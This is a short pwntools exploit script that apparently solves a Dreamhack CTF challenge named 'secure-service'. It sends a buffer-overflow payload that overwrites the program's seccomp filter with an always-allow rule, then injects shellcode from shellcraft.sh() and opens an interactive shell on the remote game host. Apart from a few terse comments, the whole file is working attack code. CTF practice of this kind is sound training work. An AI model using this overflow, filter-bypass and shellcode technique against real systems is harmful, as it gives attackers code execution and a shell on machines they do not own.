from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/secureservice/deploy/secure-service')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:12367'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#first- overwrite filter with empty 
#empty is return allow
# 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
# we send it like this
allow = p64(0x7fff000000000006)

#gdb.attach(p, gdbscript = '''
#brva 0x1349
#c
#''')

p.recvuntil(b"? ")
p.sendline(b"bof")
p.recvuntil(b": ")
#before
#0x555555558100 <filter>:        0x0000000400000020      0xc000003e00010015
#0x555555558110 <filter+16>:     0x0000000000000006      0x0000000000000000


payload =  b'\x41'*128 + allow * 4 + p64(0x0)*12  + p64(0x2)
p.sendline(payload)


sh = asm(shellcraft.sh())
p.recvuntil(b"? ")
p.sendline(b"shellcode")
p.recvuntil(b": ")
p.send(sh)

p.interactive()
